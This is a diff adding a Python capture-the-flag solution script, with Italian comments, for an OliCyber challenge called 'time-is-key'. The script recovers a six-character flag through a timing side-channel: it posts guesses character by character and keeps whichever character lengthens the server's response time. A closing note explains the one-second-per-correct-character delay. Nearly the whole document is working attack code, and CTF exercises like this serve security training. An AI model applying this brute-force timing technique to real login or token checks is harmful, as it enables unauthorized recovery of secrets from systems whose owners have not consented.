@@ -1,0 +1,38 @@
+import requests
+import time
+import string
+
+# URL del server vulnerabile
+URL = "http://time-is-key.challs.olicyber.it/"
+
+# Possibili caratteri della flag (modificabile se necessario)
+CHARSET = string.ascii_letters + string.digits + "_{}"
+
+# Flag da ricostruire
+flag = ""
+
+# Lunghezza della flag (nota dallo script PHP)
+FLAG_LEN = 6
+
+for i in range(FLAG_LEN):
+    for char in CHARSET:
+        test_flag = flag + char + "A" * (FLAG_LEN - len(flag) - 1)  # Padding per raggiungere lunghezza 6
+        data = {"flag": test_flag}
+
+        start_time = time.time()
+        response = requests.post(URL, data=data)
+        elapsed_time = time.time() - start_time
+
+        print(f"Testing {test_flag} - Tempo: {elapsed_time:.2f}s")
+
+        if elapsed_time > (i + 1):  # Se il tempo aumenta, il carattere è corretto
+            flag += char
+            print(f"[+] Carattere corretto trovato: {flag}")
+            break
+
+print(f"[+] Flag trovata: {flag}")
+
+
+
+
+timing attack perchè per ogni carattere giusto aspetta un secondo, quindi vendo quanl'è il tempo di risposta e se è di 1 secondo il carattere è corretto
